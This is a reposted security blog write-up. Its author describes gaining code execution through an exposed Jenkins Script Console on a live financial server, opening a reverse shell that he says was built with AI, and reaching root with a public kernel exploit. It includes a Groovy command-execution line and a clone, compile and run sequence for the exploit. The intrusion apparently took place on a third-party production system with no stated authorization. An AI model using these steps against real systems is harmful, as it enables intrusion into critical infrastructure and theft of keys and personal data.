# :game_die: I Found Root Access on Critical Financial Infrastructure Using a Two-Day-Old Kernel Exploit

> **Original Source:** [I Found Root Access on Critical Financial Infrastructure Using a Two-Day-Old Kernel Exploit](https://infosecwriteups.com/i-found-root-access-on-critical-financial-infrastructure-using-a-two-day-old-kernel-exploit-032c97d4e0c1)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# I Found Root Access on Critical Financial Infrastructure Using a Two-Day-Old Kernel Exploit


My name is Hamza Hashim. I’m an offensive security researcher and if you’ve followed my work before, you know I like to share what I find in the wild, not to show off, but because I genuinely believe the community gets stronger when we talk openly about how these things happen.
This is one of those stories.

## A Little Context First


Two days before this all happened, a new Linux kernel vulnerability dropped publicly. It’s called Dirty Frag, tracked as CVE-2026–43284. The security community was still digesting it. People were writing analysis threads, researchers were testing it in isolated environments, and most production servers hadn’t even had time to see a patch advisory yet, let alone apply one.


After reading about it and watching some video tutorials, I’ve gained a basic understanding, though I’m still only about half confident in my grasp of it


I had no idea I’d be using it two days later on a live financial server.

## It Started Like Every Other Session


I was doing reconnaissance. The kind of low-noise, broad scanning work that makes up a huge chunk of an offensive researcher’s day. Most of the time nothing interesting shows up.


On the morning of May 9th, something stared back.


Port 8080 was open on a target host. I hit it in the browser almost out of habit. And there it was a Jenkins dashboard, completely exposed, no authentication wall, no warning banner, nothing. Just a clean, fully functional Jenkins UI sitting directly on the public internet like someone had just forgotten to close it after using it.


My first instinct wasn’t excitement. It was dread. Because at this point, I’ve been doing this long enough to recognize that a naked Jenkins instance means someone, somewhere, made a very serious mistake and the question isn’t *if* there’s impact, it’s *how much*.

## Reading the Room


Before touching anything, I spent time just looking. The Jenkins dashboard showed me a list of active projects and recent builds, and what I saw made my stomach drop a little.


The project names told me everything I needed to know about the severity of what I was looking at. These weren’t hobby projects or internal tooling. The build logs referenced commits for live, production-grade systems tied to transaction processing, government subsidy programs, and merchant integrations for a major commercial bank.


This wasn’t a forgotten development sandbox. This was a CI/CD pipeline for live, critical financial infrastructure.


I took a breath and kept going.

## The Door Was Wide Open


Jenkins has a `/manage` endpoint — it's the administrative control panel where you configure the server, manage users, and access powerful built-in tools. On a properly configured Jenkins instance, you need admin credentials to get anywhere near it.


When I navigated to `/manage`, it redirected me to a login page. Fine, expected. But right next to the login form was something that absolutely should not have been there on a server like this, a Register button.


Open registration. On the management panel. Of a critical financial infrastructure server.


I registered an account. I was in.


Just like that, I had access to the full Jenkins management interface. And sitting right there in the management panel was the tool that every attacker dreams about finding on a Jenkins instance — the Script Console, accessible at `/manage/script`.


For those unfamiliar: the Jenkins Script Console lets you execute arbitrary Groovy code directly on the host machine. It’s a legitimate admin tool for debugging and automation. In the hands of an unauthorized user, it’s essentially unrestricted code execution handed to you on a plate.

## Proving It Was Real


Before doing anything further, I wanted a clean, irrefutable proof-of-concept. Something non-destructive that would confirm system-level access without touching anything I shouldn’t.


I typed one line into the Script Console:


```
println "id".execute().text
```


Hit run.


The output came back instantly:


```
uid=113(jenkins) gid=117(jenkins) groups=117(jenkins),113(docker)
```


I was executing commands on the server as the `jenkins` user. This alone unauthenticated, from the public internet, no credentials, no exploit, just a registration form, was already a critical severity finding. CVSS 10.0 territory. I could have stopped here, written the report, and it would have been a significant disclosure.


## Get ReFang’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


But I needed to understand the real blast radius. What could an attacker with bad intentions actually do here? How far could this go?

## Getting a Shell


From the Script Console, I built a Groovy reverse shell payload using A.I, a script that would have the server reach back out to my machine and hand me an interactive terminal session. I set up a listener on my end and ran the payload.


The connection came in within seconds.


I now had a live, interactive shell on the server as the `jenkins` user. I could run commands, browse the filesystem, and explore the environment freely. At this point the compromise was real — not theoretical, not a proof-of-concept click, but an actual shell session on a server routing live financial transactions.

## Dirty Frag: Two Days Old and Already Relevant


I was not able to do much as jenkins user and thought of privesc. The first thing that flashed through my mind was that conversation I’d been having with myself two nights earlier when I read the Dirty Frag disclosure.


It had been public for two days. The patch existed. But only few people had applied it.


I pulled down the proof-of-concept exploit that had been published alongside the vulnerability disclosure:


```
git clone https://github.com/V4bel/dirtyfrag.git
cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil
./exp
```


It took maybe thirty seconds. And then the prompt changed.


```
root@ubuntu:~#
```


Root. Full, unrestricted, superuser access on a live financial server. Two days after the exploit dropped publicly, on a server that had no business being reachable from the internet in the first place.

## What I Found as Root


With root access, I did a careful, non-invasive directory listing of the home directory.


Database backups. SQL dump files alongside dated archive files from 2025 and 2026. These files almost certainly contain personally identifiable information — merchant details, user records, transaction data. Sitting in plaintext, in a home directory, on a rooted server.


Cryptographic keys. Private keys for both production and development environments. But the one that genuinely made me pause was a `github-actions-key`. This is a key that grants the ability to authenticate to GitHub Actions on behalf of the organization — meaning anyone holding this key can push code directly into the official repositories, bypassing every code review and security check in the pipeline. That's not just a breach of this server. That's a potential supply chain attack on every system that consumes code from these repos.


Source code. Proprietary middleware stack sitting in plaintext — transaction processing services, terminal management systems, merchant integrations. Code that should never be accessible to the open internet.


I listed the directories, took screenshots, and stopped. I did not open the SQL files. I did not copy the keys. I did not read the source code beyond confirming what was there. My job was to prove the impact was real — not to make it worse.


## Why This Actually Matters


I want to take a moment to explain why I’m writing this, because some people will read this story and think it’s just another hacker showing off a clever attack chain.


It isn’t.


The systems on this server touch real people’s lives. We’re talking about transaction infrastructure that small merchants rely on to run their businesses. Government subsidy programs that put money directly into the hands of people who need it. Banking middleware that routes transactions for millions of account holders.


A malicious actor who found this before I did — and they could have, this server was just sitting there — could have manipulated transaction records, used the private keys to impersonate the gateway at a cryptographic level, injected malicious code into the official repositories via the GitHub Actions key and poisoned every downstream system, or quietly sat on persistent access for months without anyone knowing.


The attack chain required no advanced tooling for the initial access. Sign up. Click Script Console. Get shell. The privilege escalation was a two-day-old public exploit running on an unpatched kernel. If I found this, someone else could have too.

## What I Did After


Once I had confirmed and documented the full extent of access, I stopped all testing and put together a detailed disclosure report. I reached out directly to the affected organization with full technical details and the following urgent recommendations:


Take the server offline or firewall it to internal IPs only, immediately. Disable open user registration on the management panel. Require strong authentication for all Jenkins access. Rotate every single cryptographic key found on that server — assume they are all compromised. Move all SQL backup files to an encrypted, offline vault. Patch the kernel. Audit every system this server touches for signs of prior unauthorized acces


If you’re a developer reading this: please, please don’t expose such things to the open internet, not for a second.


If you’re a researcher reading this: keep going. The boring recon sessions matter. The random port 8080 that turns out to be nothing, keep checking them, because sometimes it’s everything.


*All research conducted in good faith. No data was downloaded, no keys were copied, and no persistent access was established. Full disclosure provided to the affected organization.*


If you found this interesting, connect with me on [LinkedIn](https://www.linkedin.com/in/refang/), Happy Hacking !!

---

*Originally published on [Medium](https://infosecwriteups.com/i-found-root-access-on-critical-financial-infrastructure-using-a-two-day-old-kernel-exploit-032c97d4e0c1). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
